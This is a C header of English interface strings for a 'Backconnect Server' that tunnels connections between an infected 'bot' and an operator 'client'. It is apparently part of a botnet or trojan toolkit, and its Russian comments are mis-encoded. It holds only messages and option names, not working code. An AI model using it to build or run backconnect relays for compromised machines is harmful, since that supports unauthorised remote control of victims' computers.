/*
  язык.
*/
#pragma once

#include "..\common\cui[en].h"

////////////////////////////////////////////////////////////////////////////////////////////////////
// Ћоготип.
////////////////////////////////////////////////////////////////////////////////////////////////////

#define lng_logo BO_NAME L" Backconnect Server %u.%u.%u.%u.\nBuild time: " BO_BUILDTIME L".\n\n"

////////////////////////////////////////////////////////////////////////////////////////////////////
//  оманды и опции.
////////////////////////////////////////////////////////////////////////////////////////////////////

#define lng_command_listen         L"listen"
#define lng_command_listen_help    L"Start a backconnect server for one bot."

#define lng_switch_botport         L"bp"
#define lng_switch_botport_help    L"TCP port for accepting a connection from bot."

#define lng_switch_clientport      L"cp"
#define lng_switch_clientport_help L"TCP port for accepting a connection from сlient."

#define lng_switch_ipv4            L"ipv4"
#define lng_switch_ipv4_help       L"Listen on IPv4 port."

#define lng_switch_ipv6            L"ipv6"
#define lng_switch_ipv6_help       L"Listen on IPv6 port."

////////////////////////////////////////////////////////////////////////////////////////////////////
// Listen.
////////////////////////////////////////////////////////////////////////////////////////////////////

#define lng_listen_no_ports                         L"\nPlease type a correct TCP ports.\n"

#define lng_listen_port_ipv4                        L"Listening on IPv4 port %u.\n"
#define lng_listen_port_ipv6                        L"Listening on IPv6 port %u.\n"
#define lng_listen_wait_incoming                    L"\nPress Ctrl+C key to shutdown server.\nWaiting for incoming connections (port of bot: %u, port of client: %u)...\n"
#define lng_listen_shutdown                         L"\nShutting down server...\n"
#define lng_listen_ready                            L"\nReady!\n"
#define lng_listen_accept_bot                       L"Accepted new conection from bot (BotID: %s, IP: %s).\n"
#define lng_listen_tunnel                           L"Session created for ID: %u.\n"
#define lng_listen_error_accept_bot                 L"Failed to accepted new conection from bot! Protocol or socket error.\n"
#define lng_listen_error_accept_bot_unknown_command L"Failed to accepted new conection from bot! Unknown command %u.\n"
#define lng_listen_error_accept_bot_unknown_id      L"Failed to accepted new conection from bot! Unknown ID %u.\n"

#define lng_listen_accept_client                    L"Accepted new conection from client (IP: %s, ID: %u).\n"
#define lng_listen_accept_bclient                   L"Accepted new conection from client (IP: %s), but bot not connected! Disconnecting client!\n"
#define lng_listen_faccept_client                   L"Failed to accepted new conection from client!\n"
#define lng_listen_error_socket                     L"Socket error: %u.\n"
#define lng_listen_id_timeout                       L"Timeout for ID %u.\n"
